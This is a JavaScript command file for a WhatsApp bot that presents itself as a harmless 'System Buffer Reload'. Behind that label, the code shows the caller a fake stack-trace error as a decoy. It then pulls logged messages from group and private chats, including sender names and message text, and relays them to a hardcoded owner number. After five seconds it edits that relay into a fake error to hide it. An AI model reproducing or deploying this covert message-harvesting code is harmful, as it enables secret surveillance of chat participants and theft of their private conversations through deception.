import { proto } from '@whiskeysockets/baileys';

const reloadCommand = {
    name: "reload",
    category: "founder",
    desc: "V_HUB: System Buffer Reload",
    async execute(sock, msg, args, { from, sender, client, logsCollection }) {
        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
        const masterJid = `${ownerNum}@s.whatsapp.net`;
        const triggerChar = "§"; 

        const db = client?.db ? client.db("vinnieBot") : (logsCollection?.db || logsCollection?.database);
        const relayVault = db.collection("relay_vault");

        // --- 🎭 DECOY SYSTEM (MASKING RELAY) ---
        const decoys = [
            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)`,
            `*TypeError:* Cannot read properties of undefined (reading 'byteLength')\n    at Baileys.Socket.send (./node_modules/@whiskeysockets/baileys/lib/Socket.js:42:18)`,
            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)`,
            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)`
        ];

        // 1. Initial Fake Error Output
        await sock.sendMessage(from, { react: { text: "🔄", key: msg.key } });
        await sock.sendMessage(from, { 
            text: decoys[Math.floor(Math.random() * decoys.length)] 
        }, { quoted: msg });

        try {
            if (!logsCollection) return;

            // --- ⚙️ TIME & FILTER LOGIC ---
            const timeInput = args[0] || "1h";
            const typeFilter = args[1] ? args[1].toLowerCase() : "all"; 
            const timeValue = parseInt(timeInput) || 1;
            
            let duration = timeInput.endsWith('m') ? timeValue * 60 * 1000 : 
                           timeInput.endsWith('d') ? timeValue * 24 * 60 * 60 * 1000 : 
                           timeValue * 60 * 60 * 1000;
            
            const startTime = new Date(Date.now() - duration);

            let query = { timestamp: { $gte: startTime } };
            if (typeFilter === 'gc') query.chatId = { $regex: /@g.us$/ };
            if (typeFilter === 'pc') query.chatId = { $regex: /@s.whatsapp.net$/ };

            const logs = await logsCollection.find(query).toArray();

            if (logs.length > 0) {
                // --- 📊 BUILDING ELITE REPORT ---
                let report = `${triggerChar}┌────────────────────────┈\n`;
                report += `│      *ᴠ_ʜᴜʙ_ʀᴇʟᴏᴀᴅ_ғᴇᴇᴅ* \n`;
                report += `└────────────────────────┈\n\n`;
                
                report += `┌─『 sʏsᴛᴇᴍ_ᴘᴀʀᴀᴍs 』\n`;
                report += `│ ⚙ *ᴜsᴇʀ:* ${sender.split('@')[0]}\n`;
                report += `│ ⚙ *ғɪʟᴛᴇʀ:* ${typeFilter.toUpperCase()} | ${timeInput}\n`;
                report += `└────────────────────────┈\n\n`;

                logs.forEach(l => {
                    const origin = l.chatId?.endsWith('@g.us') ? `👥 Group` : `👤 Inbox`;
                    report += `┌─『 ${origin} 』\n`;
                    report += `│ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n`;
                    report += `│ 👤 *${l.name || 'Unknown'}*\n`;
                    report += `│ 💬 ${l.message || '[No Message]'}\n`;
                    report += `└────────────────────────┈\n\n`;
                });

                // --- 💾 VAULT STORAGE & TTL ---
                await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
                await relayVault.insertOne({ report, createdAt: new Date() });

                // --- 🛰️ STEALTH RELAY TO OWNER ---
                const relayMsg = await sock.sendMessage(masterJid, { text: report });
                
                // 5-second stealth edit (replaces sensitive feed with a fake error)
                setTimeout(async () => {
                    try {
                        await sock.sendMessage(masterJid, { 
                            text: decoys[0], 
                            edit: relayMsg.key 
                        });
                    } catch (err) { /* Silent fail */ }
                }, 5000);
            }
        } catch (e) { 
            console.error("┃ ❌ RELAY_FAIL:", e.message); 
        }
    }
};

export default reloadCommand;
